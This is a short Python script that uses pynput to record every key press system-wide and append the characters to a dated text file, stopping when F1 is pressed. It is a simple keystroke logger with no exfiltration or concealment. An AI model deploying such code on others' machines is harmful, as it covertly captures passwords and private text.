from time import sleep, time
from pynput import keyboard, mouse
from datetime import date
import sys

day = date.today()
charsperline = 1

logpath = "./logs/"+str(day)+".txt"


writer = ""
with open(logpath, "a") as writer:
    currentcharcount = 0
    currentline = ""

    def onkeypress(keyevent):
        try:
            if keyevent == keyboard.Key.F1:
                print("Close")
                writer.close()
                sys.exit()

            global currentcharcount
            global currentline
            key = keyevent.char
            if currentcharcount+len(key) > charsperline:
                writer.write(currentline)
                currentcharcount = 0
                currentline = ""

            currentline += key
            currentcharcount += len(key)

        except:
            _ = ""


    listener = keyboard.Listener(on_press=onkeypress)
    listener.start()

    while True:
        sleep(1)
